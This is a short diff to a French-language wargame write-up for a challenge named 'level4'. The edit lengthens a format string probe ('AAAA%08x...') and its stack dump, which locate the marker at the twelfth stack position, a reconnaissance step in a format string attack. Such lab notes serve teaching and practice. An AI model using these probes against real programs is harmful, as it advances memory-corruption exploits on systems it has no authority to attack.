@@ -17,8 +17,9 @@ On va pouvoir injecté du code à partir du fgets. Il sera ensuite traité par p
 Etape pour trouver la position de notre valeur AAAA dans la stack :
 
     ./level4
-    AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
-    AAAA00000200.b7fd1ac0.b7ff37d0.41414141.78383025.3830252e.30252e78.252e7838.2e783830
+    AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+    AAAAb7ff26b0.bffff784.b7fd0ff4.00000000.00000000.bffff748.0804848d.bffff540.00000200.b7fd1ac0.b7ff37d0.41414141.78383025.3830252e
+
 
 Il s'avère que l'adresse se situe à la 12ème position dans la stack :
 
